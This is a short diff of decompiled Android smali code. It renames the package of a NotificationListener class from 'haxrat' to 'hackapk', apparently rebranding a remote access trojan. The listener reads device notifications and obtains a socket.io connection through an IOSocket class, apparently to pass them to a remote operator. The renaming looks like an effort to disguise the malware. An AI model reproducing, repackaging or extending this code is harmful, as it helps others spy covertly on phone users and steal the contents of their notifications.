@@ -1,4 +1,4 @@
-.class public Lcom/hax4us/haxrat/NotificationListener;
+.class public Lcom/justhack/hackapk/NotificationListener;
 .super Landroid/service/notification/NotificationListenerService;
 .source "NotificationListener.java"
 
@@ -236,11 +236,11 @@
     move-result-object v12
 
     .line 39
-    invoke-static {}, Lcom/hax4us/haxrat/IOSocket;->getInstance()Lcom/hax4us/haxrat/IOSocket;
+    invoke-static {}, Lcom/justhack/hackapk/IOSocket;->getInstance()Lcom/justhack/hackapk/IOSocket;
 
     move-result-object v12
 
-    invoke-virtual {v12}, Lcom/hax4us/haxrat/IOSocket;->getIoSocket()Lio/socket/client/Socket;
+    invoke-virtual {v12}, Lcom/justhack/hackapk/IOSocket;->getIoSocket()Lio/socket/client/Socket;
 
     move-result-object v12
 
